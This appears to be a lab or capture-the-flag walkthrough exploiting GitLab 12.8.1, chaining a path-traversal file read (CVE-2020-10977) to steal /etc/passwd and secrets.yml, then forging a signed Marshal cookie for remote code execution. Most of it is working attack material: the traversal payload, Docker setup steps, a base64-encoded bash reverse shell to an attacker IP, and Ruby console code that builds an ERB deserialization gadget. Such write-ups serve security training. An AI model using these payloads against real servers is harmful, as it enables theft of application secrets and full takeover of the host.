CVEs: CVE-2018-19571 (SSRF) + CVE-2018-19585 (CRLF) & CVE-2020-10977

Steps to reproduce:
1. Create two projects
2. Add an issue with the following description:
```text
![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)
```
3. Move the issue to the second project
![[GitLab-1.png]]

The same method to read file `/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml`

## Cookies deserialization
Setup gitlab environment

Pull the Docker image for the same version like so.

Example for the lab: GitLab Community Edition 12.8.1
```bash
docker pull gitlab/gitlab-ce:12.8.1-ce.0
```

Next, Running the image in a detached container.
```bash
docker run --detach --hostname gitlab --name gitlab gitlab/gitlab-ce:12.8.1-ce.0
```

Finally, Openning up a terminal in the container.
```bash
docker exec -it gitlab bash
```
### Generate Marshalled payload
Changing the `secret_key_base` in the container with the one obtained from `secrets.yml` above.
![[GitLab-2.png]]

Encode Reverse Shell.
```bash
echo 'bash -i >& /dev/tcp/10.10.14.3/443 0>&1' | base64     
```

Generate Marshalled payload in the form of a cookie using gitlab-rails console.
```bash
request = ActionDispatch::Request.new(Rails.application.env_config)
request.env["action_dispatch.cookies_serializer"] = :marshal
cookies = request.cookie_jar

erb = ERB.new("<%= `bash -c 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzQ0MyAwPiYxCg== | base64 -d | bash'` %>")
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
cookies.signed[:cookie] = depr
puts cookies[:cookie]
```

### Getting RCE
![[GitLab-3.png]]